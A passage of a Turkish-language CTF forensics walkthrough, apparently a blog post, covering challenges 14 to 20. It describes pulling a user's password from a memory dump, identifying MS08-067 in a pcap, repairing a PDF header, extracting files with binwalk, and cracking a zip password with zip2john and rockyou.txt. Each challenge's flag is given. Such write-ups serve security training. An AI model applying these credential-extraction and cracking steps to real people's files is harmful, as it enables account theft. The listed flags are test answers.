-&lt;a href=&quot;https://3.bp.blogspot.com/-gNkcnuPp_IM/WSr_JQvERNI/AAAAAAAAAgw/vE77q1_KPbw_AXBfiPKINzFL4_BSaHvTgCLcB/s1600/Screenshot_4.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;356&quot; data-original-width=&quot;891&quot; height=&quot;127&quot; src=&quot;https://3.bp.blogspot.com/-gNkcnuPp_IM/WSr_JQvERNI/AAAAAAAAAgw/vE77q1_KPbw_AXBfiPKINzFL4_BSaHvTgCLcB/s320/Screenshot_4.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-“findpassword MİNİ DUMP” dosyamızın içindeki “login passwordleri” çıkardığımızda ahmet gürel kullanıcısı için bir çok password türü çıkıyor deneyip yanıldıktan sonra asıl “flag” cevabımızın ahmet gürel kullanıcısının şifresi olan “canyoupwnmectf” olduğunu buluyoruz.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-zlD7UoEs-eI/WSr_d1wi89I/AAAAAAAAAg0/3DCUgjRO46cgNlHOLWSralY0MMIb6cGUACLcB/s1600/Screenshot_1.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;498&quot; data-original-width=&quot;941&quot; height=&quot;169&quot; src=&quot;https://2.bp.blogspot.com/-zlD7UoEs-eI/WSr_d1wi89I/AAAAAAAAAg0/3DCUgjRO46cgNlHOLWSralY0MMIb6cGUACLcB/s320/Screenshot_1.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-14.Sorumuz’un cevabı : cypwn_{canyoupwnmectf}&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-1WQPlIa5sf4/WSr_w5vFfKI/AAAAAAAAAg4/EKO_8OjszO4E4PoW978A7FfQc6ofCALqgCLcB/s1600/Screenshot_5.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;594&quot; data-original-width=&quot;598&quot; height=&quot;317&quot; src=&quot;https://4.bp.blogspot.com/-1WQPlIa5sf4/WSr_w5vFfKI/AAAAAAAAAg4/EKO_8OjszO4E4PoW978A7FfQc6ofCALqgCLcB/s320/Screenshot_5.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-15.Sorumuz’a geçelim : Attack Type&lt;br /&gt;
-&lt;br /&gt;
-İpucumuz : Pcap dosyasında bir saldırı gerçekleşmektedir.Hangi zafiyet exploit edilmeye çalışılmıştır?&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-90xL554JrOU/WSssrEvDjHI/AAAAAAAAAhI/Z8LqbCFyYawxFsL6Uw-irDiSdm6Y06DkQCLcB/s1600/Screenshot_6.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;568&quot; data-original-width=&quot;598&quot; height=&quot;303&quot; src=&quot;https://2.bp.blogspot.com/-90xL554JrOU/WSssrEvDjHI/AAAAAAAAAhI/Z8LqbCFyYawxFsL6Uw-irDiSdm6Y06DkQCLcB/s320/Screenshot_6.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-İndirdiğimiz “rar” dosyasından bir adet .pcap dosyası çıktı ve gözümüz wireshark’a kaydı başlayalım incelemeye.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://3.bp.blogspot.com/-3Ci0vdqM_0I/WSstO5t0DtI/AAAAAAAAAhQ/E_Zzmu3TeasMmpsxNNvE7zcn83H_p8wogCLcB/s1600/Screenshot_7.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;718&quot; data-original-width=&quot;1361&quot; height=&quot;168&quot; src=&quot;https://3.bp.blogspot.com/-3Ci0vdqM_0I/WSstO5t0DtI/AAAAAAAAAhQ/E_Zzmu3TeasMmpsxNNvE7zcn83H_p8wogCLcB/s320/Screenshot_7.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Çoğu paket’ten smb portları gözüktü microsoft-ds portları gözüktü azıcık bir gözümüz açıldı.&lt;br /&gt;
-&lt;br /&gt;
-Ama wireshark ile birşey bulamadık biz birde “NetworkMiner” aracı ile göz atalım ama bir sorunumuz var “NetworkMiner” sadece .pcap dosyalarını kabul ediyor bize gelen dosya .pcapng bunu .pcap yapmamız gerek yada para verip”NetworkMiner”in sürümünü yükseltmemiz gerek.&lt;br /&gt;
-&lt;br /&gt;
-http://pcapng.com/ ile pcapng dosyamızı .pcap’e çevirdik ve network miner ile dosyamızı açtık.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://3.bp.blogspot.com/-0m0Dk5r-F08/WSsv4t-vThI/AAAAAAAAAhc/a2HjKCOUGxUlSv7ylB1nXS_Q7wg3QeMPwCLcB/s1600/Screenshot_8.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;665&quot; data-original-width=&quot;1341&quot; height=&quot;158&quot; src=&quot;https://3.bp.blogspot.com/-0m0Dk5r-F08/WSsv4t-vThI/AAAAAAAAAhc/a2HjKCOUGxUlSv7ylB1nXS_Q7wg3QeMPwCLcB/s320/Screenshot_8.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-Sorumuzu kavradığımız için bizden zaafiyet tipini istiyor. netbios-ssn için vuln sürümlerine bakıp deneyip yanıldığımızda.Bunun MS08-067 olduğunu buluyoruz.&lt;br /&gt;
-&lt;br /&gt;
-15.Sorumuz’un cevabı : cypwn_{MS08-067}&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-8sUOvqA9no8/WSswObsfdzI/AAAAAAAAAhg/3UTIgijfhfA24pMqZiXHsoki1AfdZRldQCLcB/s1600/Screenshot_9.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;587&quot; data-original-width=&quot;593&quot; height=&quot;316&quot; src=&quot;https://1.bp.blogspot.com/-8sUOvqA9no8/WSswObsfdzI/AAAAAAAAAhg/3UTIgijfhfA24pMqZiXHsoki1AfdZRldQCLcB/s320/Screenshot_9.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-16.Sorumuz’a geçelim : Imaj Tools&lt;br /&gt;
-&lt;br /&gt;
-İpucumuz : Ram Imajı alınırken hangi araç kullanıldığını bulmamıza yardım et !&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-n2K0lLrvSy4/WSsz3QX2hAI/AAAAAAAAAhs/MDISwtwm0tYzQN8jkEQcy8J21Z4PrZtAgCLcB/s1600/Screenshot_10.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;537&quot; data-original-width=&quot;597&quot; height=&quot;287&quot; src=&quot;https://1.bp.blogspot.com/-n2K0lLrvSy4/WSsz3QX2hAI/AAAAAAAAAhs/MDISwtwm0tYzQN8jkEQcy8J21Z4PrZtAgCLcB/s320/Screenshot_10.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Bu soruda biraz arada kaldım çünkü “volatility” olabilirdi cevabı ama sonradan ram imaj almak için kullanılan toolları incelerken “RamCapture”ye denk geldim ve cevapta tahmin ettiğim gibi çıktı.&lt;br /&gt;
-&lt;br /&gt;
-16.Sorumuz’un cevabı : cypwn_{RamCapture}&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://3.bp.blogspot.com/-HHGpox-N0ZA/WSs1y8ZptEI/AAAAAAAAAh4/tB-pRL4vuqwMuWAVdVJ-ma8M-0ncmT63wCLcB/s1600/Screenshot_11.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;583&quot; data-original-width=&quot;586&quot; height=&quot;318&quot; src=&quot;https://3.bp.blogspot.com/-HHGpox-N0ZA/WSs1y8ZptEI/AAAAAAAAAh4/tB-pRL4vuqwMuWAVdVJ-ma8M-0ncmT63wCLcB/s320/Screenshot_11.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-17.Sorumuz’a geçelim : Change is good&lt;br /&gt;
-&lt;br /&gt;
-Bu soruda ipucumuz yok.Herşeyi devletten beklememek lazım :D&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://3.bp.blogspot.com/-edpGWwd7VSE/WSs3mMN0_BI/AAAAAAAAAiE/gYi1bk3_S3IpvI043lu5V23oVsP1s4YkwCLcB/s1600/Screenshot_12.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;444&quot; data-original-width=&quot;599&quot; height=&quot;237&quot; src=&quot;https://3.bp.blogspot.com/-edpGWwd7VSE/WSs3mMN0_BI/AAAAAAAAAiE/gYi1bk3_S3IpvI043lu5V23oVsP1s4YkwCLcB/s320/Screenshot_12.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Bu soruda baya bir uğraştım son pes edecekken hex ile bakayım dedim ve yolumu oradan çizip bu soruyu çözdüm.&lt;br /&gt;
-&lt;br /&gt;
-öncelikle linux’ta default olarak gelen “hexdump”u kullanıp dosyayı açtım.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-yVrBBZL7fzY/WSs4xHgMF7I/AAAAAAAAAiQ/a6nlKQLMwNcGOgx_m6usQ3HG1bG4BBHSwCLcB/s1600/Screenshot_13.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;396&quot; data-original-width=&quot;962&quot; height=&quot;131&quot; src=&quot;https://1.bp.blogspot.com/-yVrBBZL7fzY/WSs4xHgMF7I/AAAAAAAAAiQ/a6nlKQLMwNcGOgx_m6usQ3HG1bG4BBHSwCLcB/s320/Screenshot_13.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Garip bir şekilde dosyamızın headerleri yok’tu yani dosyanın ne olduğu belirtilmemişti.&lt;br /&gt;
-&lt;br /&gt;
-http://www.garykessler.net/library/file_sigs.html&lt;br /&gt;
-&lt;br /&gt;
-Bu siteyi kullanarak dosya headerlerine ulaştım ama dosyaya hangi headeri vereceğimi bilmiyordum.&lt;br /&gt;
-&lt;br /&gt;
-“strings” komutu ile dosyayı baya bir inceledikten sonra dosyanın içinde pdf yazılarının geçtiğini gördüm.&lt;br /&gt;
-&lt;br /&gt;
-Hemen sitemizden “PDF” headerlerini alıp dosyayı yeniden düzenliyecektik.&lt;br /&gt;
-&lt;br /&gt;
-Hex editörümüz ile dosyayı açıp işlemlere başladık.&lt;br /&gt;
-&lt;br /&gt;
-PDF Header intleri : &lt;span style=&quot;background-color: white; font-family: &amp;quot;courier&amp;quot;;&quot;&gt;25 50 44 46&lt;/span&gt;&lt;br /&gt;
-&lt;span style=&quot;background-color: white; font-family: &amp;quot;courier&amp;quot;;&quot;&gt;&lt;br /&gt;&lt;/span&gt;
-&lt;span style=&quot;background-color: white; font-family: &amp;quot;courier&amp;quot;;&quot;&gt;Nopların yerine “00 00 00 00” PDF headerlerimizi koyacaktık.&lt;/span&gt;&lt;br /&gt;
-&lt;span style=&quot;background-color: white; font-family: &amp;quot;courier&amp;quot;;&quot;&gt;&lt;br /&gt;&lt;/span&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-8oMZ1wmo7XI/WSs51NZJAPI/AAAAAAAAAiY/YevgVA5Aa0k1Dsb96Ts2I9LG3sSRI7V2ACLcB/s1600/Screenshot_14.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;511&quot; data-original-width=&quot;999&quot; height=&quot;163&quot; src=&quot;https://2.bp.blogspot.com/-8oMZ1wmo7XI/WSs51NZJAPI/AAAAAAAAAiY/YevgVA5Aa0k1Dsb96Ts2I9LG3sSRI7V2ACLcB/s320/Screenshot_14.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Dosyamızı pdf olarak editledik’ten sonra açınca karşımıza böyle bir yazı çıktı :&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-AzmFpxG0YcU/WSs6LQYQxNI/AAAAAAAAAic/9a9Rkx-Jy2csDGXzrHq62rRGtLdqIpQgQCLcB/s1600/Screenshot_15.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;521&quot; data-original-width=&quot;1177&quot; height=&quot;141&quot; src=&quot;https://2.bp.blogspot.com/-AzmFpxG0YcU/WSs6LQYQxNI/AAAAAAAAAic/9a9Rkx-Jy2csDGXzrHq62rRGtLdqIpQgQCLcB/s320/Screenshot_15.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Sorumuzun cevabını “interesting” olarak girince sonuca ulaşmış olduk.&lt;br /&gt;
-&lt;br /&gt;
-17.Sorumuz’un cevabı : cypwn_{interesting}&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-92ZDQ3-rTls/WSs6dqj7bcI/AAAAAAAAAig/mJDX8eDcGlcNd-tRgLd0q4iBWiwCb87MwCLcB/s1600/Screenshot_16.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;498&quot; data-original-width=&quot;598&quot; height=&quot;266&quot; src=&quot;https://2.bp.blogspot.com/-92ZDQ3-rTls/WSs6dqj7bcI/AAAAAAAAAig/mJDX8eDcGlcNd-tRgLd0q4iBWiwCb87MwCLcB/s320/Screenshot_16.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-18.Sorumuz’a geçelim : Miyav&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-eYw8D5jtIsU/WSs8fA_TxmI/AAAAAAAAAis/lIUDFfOc38si6m2B900suiu6rt8-dcLHgCLcB/s1600/Screenshot_17.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;442&quot; data-original-width=&quot;598&quot; height=&quot;236&quot; src=&quot;https://1.bp.blogspot.com/-eYw8D5jtIsU/WSs8fA_TxmI/AAAAAAAAAis/lIUDFfOc38si6m2B900suiu6rt8-dcLHgCLcB/s320/Screenshot_17.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Bu sorumuzda bizi şirin bir kedi karşılıyor.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-rEvwAHKMWVo/WStCFkRBPkI/AAAAAAAAAjU/ymU7-MyaAPQ1qiFpTZB8ziA7dOZ0ADkNgCLcB/s1600/Screenshot_23.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;484&quot; data-original-width=&quot;792&quot; height=&quot;195&quot; src=&quot;https://4.bp.blogspot.com/-rEvwAHKMWVo/WStCFkRBPkI/AAAAAAAAAjU/ymU7-MyaAPQ1qiFpTZB8ziA7dOZ0ADkNgCLcB/s320/Screenshot_23.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-Kedimizi “file” komutu ile bir inceliyoruz.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://3.bp.blogspot.com/-xCzUfZUsaLY/WSs8-9L_fxI/AAAAAAAAAi0/z_idcFCgE38yzFnPR_LSaZwokUnMMgKWACLcB/s1600/Screenshot_18.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;176&quot; data-original-width=&quot;963&quot; height=&quot;58&quot; src=&quot;https://3.bp.blogspot.com/-xCzUfZUsaLY/WSs8-9L_fxI/AAAAAAAAAi0/z_idcFCgE38yzFnPR_LSaZwokUnMMgKWACLcB/s320/Screenshot_18.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Kedimizin .jpg değilde .jpeg olduğunu söylüyor komutumuz bize değiştirip baktığımızda herhangi bir flag türü birşey göremiyoruz aklımız ne kadar “steganography”ye kaysada arkada başka birşeyler var diyip “binwalk” toolumuzu kullanıyoruz.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-gn_PJ1PKOFY/WStAfmaDZgI/AAAAAAAAAjA/TIVKB-6OLpcc7ZkWuxibHs7CIu-bITIEgCLcB/s1600/Screenshot_19.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;335&quot; data-original-width=&quot;961&quot; height=&quot;111&quot; src=&quot;https://2.bp.blogspot.com/-gn_PJ1PKOFY/WStAfmaDZgI/AAAAAAAAAjA/TIVKB-6OLpcc7ZkWuxibHs7CIu-bITIEgCLcB/s320/Screenshot_19.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-“binwalk”ın yanında kullandığım -e parametresi “extract” anlamına geliyor.&lt;br /&gt;
-&lt;br /&gt;
-Şirin kedimizin içinden 1 adet “zip” dosyası 2 adette “ASCII” yani text dosyası çıkardık.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-_fQWfHrCUPM/WStBpoPpt2I/AAAAAAAAAjM/gncQD1A1dUMxZuiRmdmNm2Hd79S0Jtf3ACLcB/s1600/Screenshot_21.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;277&quot; data-original-width=&quot;993&quot; height=&quot;89&quot; src=&quot;https://1.bp.blogspot.com/-_fQWfHrCUPM/WStBpoPpt2I/AAAAAAAAAjM/gncQD1A1dUMxZuiRmdmNm2Hd79S0Jtf3ACLcB/s320/Screenshot_21.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-“ASCII” dosyalarımızı açtığımızda içinden “ameno” yazan bir yazı çıkıyor.&lt;br /&gt;
-&lt;br /&gt;
-Sorumuza cevap olarak bunu denediğimizde flag answerimizi buluyoruz.&lt;br /&gt;
-&lt;br /&gt;
-18.Sorumuz’un cevabı : cypwn_{ameno}&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-GwsO35MFTFU/WStBzvgBr-I/AAAAAAAAAjQ/AZjKXhvUhCMxxIE94aHDo4JtZ8YprkFIgCLcB/s1600/Screenshot_22.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;496&quot; data-original-width=&quot;594&quot; height=&quot;267&quot; src=&quot;https://1.bp.blogspot.com/-GwsO35MFTFU/WStBzvgBr-I/AAAAAAAAAjQ/AZjKXhvUhCMxxIE94aHDo4JtZ8YprkFIgCLcB/s320/Screenshot_22.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-19.Sorumuz’a geçelim : Attack IP&lt;br /&gt;
-&lt;br /&gt;
-İpucumuz : pcap dosyasında bir saldırı gerçekleşmektedir.Saldırganın IP sini bulmamıza yardım etmelisin.&lt;br /&gt;
-&lt;br /&gt;
-İpucumuz’dan anladığınız gibi bir pcap dosyasını analiz edip flag değerine saldırganın ip’sini vermemiz gerek.&lt;br /&gt;
-&lt;br /&gt;
-İndirdiğimiz atak.pcap dosyasını incelediğimizde :&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-VHzKXRW-dFc/WStNxuHyAzI/AAAAAAAAAjk/kcsIPTd36hw2b6e5wLe_CY6Pud9BTpavwCLcB/s1600/Screenshot_25.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;690&quot; data-original-width=&quot;1349&quot; height=&quot;163&quot; src=&quot;https://2.bp.blogspot.com/-VHzKXRW-dFc/WStNxuHyAzI/AAAAAAAAAjk/kcsIPTd36hw2b6e5wLe_CY6Pud9BTpavwCLcB/s320/Screenshot_25.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Request’i gönderen ip’nin ve alan ip’nin değiştiğini ama genelde aynı olduğunu görebiliyoruz.&lt;br /&gt;
-&lt;br /&gt;
-Elimizde 4 ip var ve içlerinden biri bizim flag answerimiz çıkacak deniyip gördüğümüzde, cevabımızın “192.168.237.128” local ip’si olduğunu görebiliyoruz.&lt;br /&gt;
-&lt;br /&gt;
-19.Sorumuz’un cevabı : cypwn_{192.168.237.128}&lt;br /&gt;
-&lt;br /&gt;
-                                 &lt;a href=&quot;https://4.bp.blogspot.com/-X9QsTPK7ag8/WStOqg5mFEI/AAAAAAAAAjs/EE2KsFeddm4cDWx8T00OaqM8xPxoc-H8ACLcB/s1600/Screenshot_26.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em; text-align: center;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;617&quot; data-original-width=&quot;590&quot; height=&quot;320&quot; src=&quot;https://4.bp.blogspot.com/-X9QsTPK7ag8/WStOqg5mFEI/AAAAAAAAAjs/EE2KsFeddm4cDWx8T00OaqM8xPxoc-H8ACLcB/s320/Screenshot_26.png&quot; width=&quot;305&quot; /&gt;&lt;/a&gt;&lt;br /&gt;
-&lt;br /&gt;
-20.Sorumuz’a geçelim : Is Empty?&lt;br /&gt;
-&lt;br /&gt;
-İpucumuz : Daha dün baktım burdaydı ama şimdi bulamıyorum?&lt;br /&gt;
-&lt;br /&gt;
-Bu sorumuz’da zip dosyamızı hash’e çevirmemiz gerekiyor bunun için arkadaşlar çok güzel bir makale hazırlamış incelemek isterseniz ingilizcesi olana güzel :/ : https://blog.sleeplessbeastie.eu/2015/05/25/how-to-crack-archive-password-faster/&lt;br /&gt;
-&lt;br /&gt;
-Öncelikle zip dosyamızı “zip2john” ile hash’e çeviriyoruz :&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-sG4vONUaXWo/WSuHUUnHvWI/AAAAAAAAAj8/7x8QlG2tqmYglcoDOoU70sj1OI_DG46NwCLcB/s1600/Screenshot_1.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;465&quot; data-original-width=&quot;972&quot; height=&quot;152&quot; src=&quot;https://4.bp.blogspot.com/-sG4vONUaXWo/WSuHUUnHvWI/AAAAAAAAAj8/7x8QlG2tqmYglcoDOoU70sj1OI_DG46NwCLcB/s320/Screenshot_1.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Sonra hash dosyamızı “rockyou.txt” wordlist’i ile şifresini çözmek için döngüye sokuyoruz ve bulduğumuz şifreyi okuyoruz :&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://3.bp.blogspot.com/-blNe4gYpIuE/WSuIOJpO03I/AAAAAAAAAkE/LROd7OFLOpoVAZewg8bUoeJC0-FmeMSEACLcB/s1600/Screenshot_2.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;149&quot; data-original-width=&quot;752&quot; height=&quot;63&quot; src=&quot;https://3.bp.blogspot.com/-blNe4gYpIuE/WSuIOJpO03I/AAAAAAAAAkE/LROd7OFLOpoVAZewg8bUoeJC0-FmeMSEACLcB/s320/Screenshot_2.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Şifremiz : 12345 çıktı :P&lt;br /&gt;
-&lt;br /&gt;
-Dosyamızı açtıktan sonra incelemeye başlıyoruz flag bulabilecekmiyiz diye.&lt;br /&gt;
-&lt;br /&gt;
-uzun bir süreden sonra(25 dk xD) bir github linkine denk geliyoruz.&lt;br /&gt;
-&lt;br /&gt;
-“.git/” dizinin içindeki “config” dosyasında.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-YCNqwwiTYkU/WSuJz9tJz7I/AAAAAAAAAkQ/Se1up6yoGLo-KIlUq5atam_o3ftCTr5LgCLcB/s1600/Screenshot_3.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;513&quot; data-original-width=&quot;999&quot; height=&quot;164&quot; src=&quot;https://4.bp.blogspot.com/-YCNqwwiTYkU/WSuJz9tJz7I/AAAAAAAAAkQ/Se1up6yoGLo-KIlUq5atam_o3ftCTr5LgCLcB/s320/Screenshot_3.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
